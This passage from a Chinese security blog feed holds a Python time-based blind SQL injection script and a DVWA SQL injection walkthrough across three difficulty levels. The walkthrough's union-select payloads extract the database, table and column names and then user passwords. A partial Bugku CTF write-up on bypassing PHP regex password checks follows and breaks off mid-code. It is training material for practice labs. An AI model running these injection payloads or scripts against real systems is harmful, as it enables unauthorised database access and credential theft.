print(<span class="string">'The length of database is:'</span>,database_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库名:dvwa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        s=requests.Session()</span><br><span class="line">        s.post(url_input,data=data)</span><br><span class="line">        r=s.get(url_index)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">            database=database+chr(j)</span><br><span class="line">            print(<span class="string">'The name of database is:'</span>,database)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据表总长度:15</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>,<span class="number">16</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    s.post(url_input,data=data)</span><br><span class="line">    r=s.get(url_index)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    print(t)</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        table_length=i</span><br><span class="line">        print(<span class="string">'The length of table is:'</span>,table_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据表名:guestbook,users</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,1,sleep(3))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        s=requests.Session()</span><br><span class="line">        s.post(url_input,data=data)</span><br><span class="line">        r=s.get(url_index)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is:'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">3</span>):</span><br><span class="line">            table_name=table_name+chr(j)</span><br><span class="line">            print(<span class="string">'The name of table is:'</span>,table_name)</span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                table_name=table_name+<span class="string">','</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据列总长度:94</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>,<span class="number">100</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and length((select group_concat(column_name) from information_schema.columns where table_name='users'))=%d#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    s=requests.Session()</span><br><span class="line">    s.post(url_input,data=data)</span><br><span class="line">    r=s.get(url_index)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">        column_length=i</span><br><span class="line">        print(column_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据列名:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">95</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),%d,1))=%d#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        s=requests.Session()</span><br><span class="line">        s.post(url_input,data=data)</span><br><span class="line">        r=s.get(url_index)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            column_name=column_name+chr(j)</span><br><span class="line">            print(<span class="string">"The name of column is:"</span>,column_name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                column_name=column_name+<span class="string">','</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      dvwa-sql
    
    </summary>
    
      <category term="dvwa-sql" scheme="https://Foxgrin.github.io/categories/dvwa-sql/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>dvwa-sql</title>
    <link href="https://Foxgrin.github.io//posts/39291/"/>
    <id>https://Foxgrin.github.io//posts/39291/</id>
    <published>2018-07-10T13:44:00.000Z</published>
    <updated>2018-07-11T07:21:27.549Z</updated>
    
    <content type="html"><![CDATA[<p>总结了dvwa中的sql注入关卡<a id="more"></a></p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include (&quot;sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&apos;id&apos;]) &amp;&amp; isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">$id=$_POST[&apos;id&apos;];</span><br><span class="line">$sql=&quot;SELECT first_name , last_name FROM users WHERE user_id=&apos;$id&apos;&quot;;</span><br><span class="line">$result=mysql_query($sql) or die(mysql_error());</span><br><span class="line">while($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">$first=$row[&apos;first_name&apos;];</span><br><span class="line">$last=$row[&apos;last_name&apos;];</span><br><span class="line">echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关毫无过滤的sql语句</p><p>提示输入id，判断可能是数字型注入</p><p>输入1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再输入1’</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>出现报错，从错误信息判断是数字型注入，且被单引号包裹 </p><p>输入1’#</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>没有报错</p><p>接下来判断查询字段数</p><p>输入1’ order by 3</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>说明查询字段数为2</p><p>那么就用联合查询来爆库</p><p>输入0’ union select database(),2 #</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入0’ union select group_concat(table_name),2 from information_schema.tables where table_schema=database()#</p><p>爆表</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入0’ union select group_concat(column_name),2 from information_schema.columns where table_name=’users’#</p><p>爆列</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入0’ union select password,user_id from users #</p><p>爆数据</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">$id=$_POST[&apos;id&apos;];</span><br><span class="line">$id=mysql_real_escape_string($id);</span><br><span class="line">$sql=&quot;SELECT first_name,last_name FROM users where user_id=$id&quot;;</span><br><span class="line">$result=mysql_query($sql) or die(mysql_error());</span><br><span class="line">while($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">$first=$row[&apos;first_name&apos;];</span><br><span class="line">$last=$row[&apos;last_name&apos;];</span><br><span class="line">echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关很明显是数字型注入，通过选择表单中的数字作为注入点，我们可以用burp抓包修改post的id值</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里id值虽然通过mysql_real_escape函数被转义处理，但是由于id没有被引号包裹，所以没有什么区别</p><p>先判断查询字段数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>字段数为2</p><p>接下来爆库</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆表</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆列</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>因为这里单引号被包裹，所以users可以转成十六进制数从而绕过转义 </p><p>爆数据</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>这关有两个页面，一个页面用来输入id值，输入的id值经过sql查询后的信息显示在主页面上</p><p>输入id值的页面代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;id&apos;]) &amp;&amp; isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">$_SESSION[&apos;id&apos;]=$_POST[&apos;id&apos;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;Session ID:&quot;.$_SESSION[&apos;id&apos;];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>主页面代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">include(&quot;sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if (isset($_SESSION[&apos;id&apos;]))&#123;</span><br><span class="line">$id=$_SESSION[&apos;id&apos;];</span><br><span class="line">$sql=&quot;SELECT first_name , last_name FROM users where user_id=&apos;$id&apos;&quot;;</span><br><span class="line">$result=mysql_query($sql) or die(mysql_error());</span><br><span class="line">while($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">$first=$row[&apos;first_name&apos;];</span><br><span class="line">$last=$row[&apos;last_name&apos;];</span><br><span class="line">echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这关把post的id值赋值给session的id值</p><p>注入点仍然是id值</p><p>跟上面关卡没什么本质区别</p><p>爆库</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆表</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆列</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆数据</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/dvwa-sql/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      dvwa-sql
    
    </summary>
    
      <category term="dvwa-sql" scheme="https://Foxgrin.github.io/categories/dvwa-sql/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>数字验证正则绕过</title>
    <link href="https://Foxgrin.github.io//posts/25617/"/>
    <id>https://Foxgrin.github.io//posts/25617/</id>
    <published>2018-07-10T12:39:00.000Z</published>
    <updated>2018-07-10T13:28:30.327Z</updated>
    
    <content type="html"><![CDATA[<p>Bugkuctf题库中的一道代码审计题,通过利用各种正则匹配函数特性最终得到flag<a id="more"></a></p><p>源代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &apos;flag&#123;test&#125;&apos;;</span><br><span class="line">if (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;])</span><br><span class="line">&#123;</span><br><span class="line">$password = $_POST[&apos;password&apos;];</span><br><span class="line">if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) //preg_match — 执行一个正则表达式匹配</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;flag&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">while (TRUE)</span><br><span class="line">&#123;</span><br><span class="line">$reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">break;</span><br><span class="line">$c = 0;</span><br><span class="line">$ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><br><span class="line">foreach ($ps as $pt)</span><br><span class="line">&#123;</span><br><span class="line">if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))</span><br><span class="line">$c += 1;</span><br><span class="line">&#125;</span><br><span class="line">if ($c &lt; 3) break;</span><br><span class="line">//&gt;=3，必须包含四种类型三种与三种以上</span><br><span class="line">if (&quot;42&quot; == $password) echo $flag;</span><br><span class="line">else echo &apos;Wrong password&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>请求方法必须为POST</p><p>首先弄明白正则匹配函数：</p><p>preg_match：执行一个正则表达式匹配，匹配到则返回1，匹配不到则返回0</p><p>preg_match_all:执行一个全局正则表达式匹配，返回成功模式匹配的次数，并将匹配结果存储到一个数组中</p><p>两个函数的区别是preg_match第一次匹配成功后就停止匹配，而preg_match_all是匹配到字符串结束为止</p><p>再弄明白几个正则匹配的特殊字符：</p><p>[:graph:] : 除空格，TAB外的所有字符<br>[:punct:] : 任何标点符号<br>[:digit:] : 任何数字<br>[:upper:] : 任何大写字母<br>[:lower:] : 任何小写字母</p><p>接下来来到第一个判断地方： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (0 &gt;= preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;, $password)) //preg_match — 执行一个正则表达式匹配</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;flag&apos;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果这个if语句执行成功，那么我们就获取不到后面的flag值，所以不能让if执行，也就是preg_match必须返回1，即正则匹配成功</p><p>在看正则表达式’/^[[:graph:]]{12,}$/’</p><p>必须以任意一个除空格，TAB外的标点符号开头和结尾，且出现至少12次</p><p>验证如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">    $password=$_GET[&apos;password&apos;];</span><br><span class="line">    $a=preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;,$password);</span><br><span class="line">    echo &apos;$a=&apos;.$a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输入12个1，看到结果返回1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入小于12个，看到结果返回0</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里需要注意，输入’+’ 会被当做是空格处理，要先将’+’进行URL编码%2b </p><p><img src="/img/数字验证正则绕过/3.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>综上，第一个输入要求，输入除空格,TAB外的字符至少十二次</p><p>在看下一个判断条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">break;</span><br></pre></td></tr></table></figure><p>如果if语句成功执行，break退出循环，我们就得不到flag值</p><p>所以我们不能让if语句成功执行，也就是说要让全局匹配成功次数大于6次</p><p>在看正则表达式’/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/’</p><p>因为是全局匹配，所以匹配成功的条件是检测到任何符号出现1次以上或者任何数字出现1次以上或者任何大写字母出现1次以上或者任何小写字母出现1次以上，一旦匹配成功一次，就开始检测下一次的匹配，这么说有点难理解，直接上代码验证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">    $password=$_GET[&apos;password&apos;];</span><br><span class="line">    $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">    $a=preg_match_all($reg,$password,$arr);</span><br><span class="line">    echo &apos;$a=&apos;.$a.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    print_r($arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里输入1aB.</p><p>匹配的过程是这样的:先检测到1，符合[:digit:]出现1次，继续检测，检测到a，符合[:lower:]出现1次，继续检测，以此类推，所以最后检测成功次数为4</p><p>同时也可以看出返回的数组有两个元素，第一个元素是整个匹配结果，第二个元素是子模式的匹配结果 </p><p>关于返回数组的详情可以参考：<a href="https://blog.csdn.net/qq_27988539/article/details/77366329" target="_blank" rel="noopener">https://blog.csdn.net/qq_27988539/article/details/77366329</a> </p><p>这题因为不牵涉到数组，就不详细研究</p><p>重点关注成功匹配的次数</p><p>这里特别说明什么时候是一次匹配的结束，就是检测到不是属于同一种特殊字符为止，因为这里每种特殊字符可以出现1次或者多次，举个例子，我们输入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>第一次匹配结束是检测到a字符，不符合[:digit:]，所以开始第二次匹配</p><p>因为这里要成功匹配6次以上，所以每种类型的字符必须间隔出现6次以上，结合第一个条件，字符出现12个以上，于是我们可以输入11aaBB..22cc</p><p>验证一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">    $password=$_GET[&apos;password&apos;];</span><br><span class="line">    if(0&gt;=preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;,$password))&#123;</span><br><span class="line">        echo &apos;Wrong Format 1&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">    if(6&gt;preg_match_all($reg,$password,$arr))&#123;</span><br><span class="line">        echo &apos;Wrong Format 2&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;success&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再来看第三个条件： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$c = 0;</span><br><span class="line">$ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><br><span class="line">foreach ($ps as $pt)</span><br><span class="line">&#123;</span><br><span class="line">if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))</span><br><span class="line">$c += 1;</span><br><span class="line">&#125;</span><br><span class="line">if ($c &lt; 3) break;</span><br></pre></td></tr></table></figure><p>如果$c&lt;3，那么我们就得不到flag值，也就是说要让$c&gt;=3，即成功匹配三次或以上</p><p>即出现三种类型字符或以上，按上面的输入：11aaBB..22cc，就行了，验证一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">    $password=$_GET[&apos;password&apos;];</span><br><span class="line">    if(0&gt;=preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;,$password))&#123;</span><br><span class="line">        echo 